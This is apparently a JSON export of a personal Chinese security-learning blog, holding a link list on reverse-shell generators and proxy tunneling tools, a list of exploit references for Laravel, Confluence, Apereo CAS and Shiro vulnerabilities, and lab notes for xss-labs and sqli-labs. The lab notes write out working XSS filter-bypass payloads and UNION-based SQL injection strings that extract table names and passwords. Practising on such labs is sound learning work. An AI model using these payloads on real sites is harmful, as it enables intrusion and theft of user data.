[{"title":"","date":"2021-04-02T08:03:41.425Z","path":"2021/04/02/url/","text":"反向shell生成（shell解密）： http://8.210.235.249/ shell加密： http://jackson-t.ca/runtime-exec-payloads.html 弹shell： https://www.zhihu.com/question/24503813 https://blog.csdn.net/Kevinhanser/article/details/88920278 https://www.jianshu.com/p/9456473a0a14 https://zhuanlan.zhihu.com/p/138393396 Docker容器部署Trojan，V2ray，SSR，brook： https://www.51it.wang/ll/1137 proxychains4配置使用：ProxyChains 是一个强制应用的 TCP 连接通过代理的工具，支持 Tor、HTTP、与 Socks 代理。与 sshuttle 不同的是，ProxyChains 只会将当前应用的 TCP 连接转发至代理，而非全局代理。 https://www.it610.com/article/1279764909290176512.htm https://blog.51cto.com/songlisha/1548812 https://blog.csdn.net/weixin_33725239/article/details/90585242 *因为 proxychains 只会代理 TCP 连接，而 ping 使用的是 ICMP。记住这一点即可。* 使用proxychains4穿透到内网：https://www.douban.com/note/751380663/?from=author 使用Github搭建属于自己的博客：https://www.jianshu.com/p/4f56cf990bba UBUNTU18.04安装FRP的配置说明：frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。 https://blog.csdn.net/weixin_43287964/article/details/107129427 https://zhuanlan.zhihu.com/p/262533456 https://www.jianshu.com/p/5cea18d28667 Ubuntu 安装V2Ray：V2Ray是一个优秀的开源网络代理工具，可以帮助你畅爽体验互联网，目前已经全平台支持Windows、Mac、Android、IOS、Linux等操作系统的使用。相对起Shadowsocks来说属于后起之秀，在混淆能力、兼容性、速度上有着独到的优点。： https://www.iyong.com/displaynews.html?id=3598834263229248 https://www.bookset.io/read/v2ray-guide/42a0e56377421ae6.md https://zhuanlan.zhihu.com/p/298035232 https://mahongfei.com/1776.html shadowsocks:https://crifan.github.io/scientific_network_summary/website/","tags":[]},{"title":"","date":"2021-04-02T08:03:08.864Z","path":"2021/04/02/POC/","text":"1.Laravel &lt;= 8.4.2 Debug模式 _ignition 远程代码执行漏洞 需要写poc https://my.oschina.net/u/4579293/blog/4898512 https://baijiahao.baidu.com/s?id=1688935331647363840&amp;wfr=spider&amp;for=pc https://www.ambionics.io/blog/laravel-debug-rce https://github.com/facade/ignition/pull/334 https://s.tencent.com/research/bsafe/1222.html POC ：https://day.fujieace.com/vulnerability/5034.html 2.Spring 模板View名称任意操作漏洞参考链接：https://github.com/veracode-research/spring-view-manipulation/ 3.Confluence 服务器端模板注入（SSTI）漏洞（CVE-2019-3396）漏洞详情请移步观看：https://zhaijiahui.github.io/2019/06/06/Confluence_CVE20193396/4.Apereo CAS 4.1.X 反序列化漏洞 远程代码执行 https://blog.csdn.net/zy15667076526/article/details/111414240 https://blog.csdn.net/leesir98/article/details/112215244 https://www.freesion.com/article/26401236905/ https://blog.csdn.net/xuandao_ahfengren/article/details/111159308 https://blog.csdn.net/zy15667076526/article/details/111414240 5.Apache shiro 已知加解密密钥泄露（可导致远程代码执行漏洞） 远程代码执行 http://www.oniont.cn/index.php/archives/298.html https://www.anquanke.com/post/id/192819 https://www.jianshu.com/p/cac9a7f2b3af http://www.likecs.com/default/index/show?id=120291 https://vlambda.com/wz_wAgsAcgbFI.html","tags":[]},{"title":"","date":"2021-04-01T09:39:12.771Z","path":"2021/04/01/XSS&SQL/","text":"xss-labs：http://test.xss.tv1234567891011121（无过滤）. *&lt;script&gt;alert(1)&lt;&#x2F;script&gt;2（闭合前面&lt;）. &quot;后面 *&quot;&gt;&lt;script&gt;alert(&#39;Vulnerable&#39;)&lt;&#x2F;script&gt;3（&#39;没有被转义）. htmlspecialchars (string, quotestyle, character-set)转义特殊字符源码关键：&lt;input name&#x3D;keyword value&#x3D;&#39;&quot;.htmlspecialchars($str).&quot;&#39;&gt;*wahs&#39; onfocus&#x3D;alert(1)&#x2F;&#x2F;*4（注释绕过）. f12观察&lt;input name&#x3D;&quot;keyword&quot; value&#x3D;&quot;&quot;&gt;的value *what&quot; onfocus&#x3D;alert(1)&#x2F;&#x2F; 5. 对scrip和onfocus和onerror关键字拆分了(script-&gt;sc_ript,onfocus-&gt;o_nfocus)。 *waw&quot;&gt;&lt;a href&#x3D;javascript:alert(1)&gt;xss&lt;&#x2F;a&gt;6（大写绕过）.在5的基础上拆分href成hr_ef,src拆成sr_c， 没有对大写过滤 *wa&quot;&gt; &lt;BODY ONLOAD&#x3D;alert(1)&gt;7（双写绕过）. *wa&quot;&gt;&lt;scrscriptipt&gt;alert(1)&lt;&#x2F;scrscriptipt&gt;8 (html实体绕过). 做了小写处理，将script和href,src,on等字符串加上下斜杠，使其无法正常解析,还将双引号实体编码，是我们不能闭合双引号，替换script,on,src,data,href,&quot;。继续用html实体编码绕过: (因为JavaScript:URL的URL字符串值可以含有HTML标记，并被格式化，其显示与其他装载进浏览器的文档完全相同)。 *javasc&amp;#x72;ipt:alert(1)9 （在8基础上隐藏代码，加入白名单）.将http加进注释&#x2F;**&#x2F; *javasc&amp;#x72;ipt:alert(1) &#x2F;*http:&#x2F;&#x2F;www.baidu.com*&#x2F;10.从form找到可以注入点弹t_sort的value值，然后增加input属性，type和onclick，*hack&amp;t_sort&#x3D;waw&quot; type&#x3D;&quot;submit&quot; onfocus&#x3D;&quot;alert(1) sql-labs:123总体思路：先找到闭合，然后and 1&#x3D;2 报错，然后union select查询database()信息，知道库后转hex爆破表，然后把表转hex爆破段。最后union select 1,已知段,3,4... from 已知表。其中的--+注释看情况添加，如第一题需要，第二题不需要。1.先用id &#x3D; 1&#39; and &#39;1&#39;&#x3D;&#39;1判断闭合条件，然后使用and 1&#x3D;2报错 联合union select 1,2,3 --+（注释掉后面），可以用union select version(),user(),database()之类的条件获取信息。然后把database()库名转成16进制码0x7365637572697479后爆破表名：?id&#x3D;1&#39; and 1&#x3D;2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;0x7365637572697479--+ 然后使用users表爆破列名：?id&#x3D;1&#39; and 1&#x3D;2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;0x7573657273--+ 发现有个users表中有个password段然后爆破数据：?id&#x3D;1&#39; and 1&#x3D;2 union select 1,password,3 from users--+2.先用id&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;1 报错，用id&#x3D;1 and 1&#x3D;1不报错，说明闭合不需要’ ，然后用union select 1,2,3查询多少个表，再用?id&#x3D;1 and 1&#x3D;2 union select 1,database(),version() 查看信息，然后把database()库名转成16进制码0x7365637572697479后爆破表名：?id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;0x7365637572697479 然后使用users表爆破列名：?id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;0x7573657273 发现有个users表中有个password段然后爆破数据：?id&#x3D;1 and 1&#x3D;2 union select 1,password,3 from users--+ dvwa:1","tags":[]},{"title":"hello-world","date":"2021-03-24T02:30:15.000Z","path":"2021/03/24/hello-world-1/","text":"","tags":[{"name":"yeaaaaaaaaaaaaaaaaah!~","slug":"yeaaaaaaaaaaaaaaaaah","permalink":"http://example.com/tags/yeaaaaaaaaaaaaaaaaah/"}]}]